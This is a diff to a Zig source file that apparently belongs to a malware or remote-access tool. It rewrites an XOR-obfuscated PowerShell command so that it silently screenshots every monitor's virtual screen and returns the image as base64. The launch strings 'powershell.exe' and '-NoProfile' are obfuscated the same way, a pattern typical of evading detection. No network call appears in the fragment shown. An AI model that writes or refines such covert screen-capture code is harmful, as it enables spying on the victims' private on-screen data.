@@ -4,15 +4,17 @@ const hash = @import("../types/hash.zig");
 const E = struct {
     pub const ps_cmd = hash.xorEncrypt(
         "Add-Type -AssemblyName System.Drawing; " ++
-        "$bmp = [System.Drawing.Bitmap]::new(" ++
-        "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, " ++
-        "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); " ++
+        "Add-Type -AssemblyName System.Windows.Forms; " ++
+        "$w=[System.Windows.Forms.SystemInformation]::VirtualScreen.Width; " ++
+        "$h=[System.Windows.Forms.SystemInformation]::VirtualScreen.Height; " ++
+        "$x=[System.Windows.Forms.SystemInformation]::VirtualScreen.Left; " ++
+        "$y=[System.Windows.Forms.SystemInformation]::VirtualScreen.Top; " ++
+        "$bmp = [System.Drawing.Bitmap]::new($w, $h); " ++
         "$g = [System.Drawing.Graphics]::FromImage($bmp); " ++
-        "$g.CopyFromScreen(0, 0, 0, 0, $bmp.Size); " ++
+        "$g.CopyFromScreen($x, $y, 0, 0, $bmp.Size); " ++
         "$ms = New-Object System.IO.MemoryStream; " ++
         "$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); " ++
-        "$ms.Close(); " ++
-        "[System.Convert]::ToBase64String($ms.ToArray())"
+        "$b64 = [System.Convert]::ToBase64String($ms.ToArray()); $ms.Close(); $b64"
     );
     pub const powershell = hash.xorEncrypt("powershell.exe");
     pub const noprofile = hash.xorEncrypt("-NoProfile");
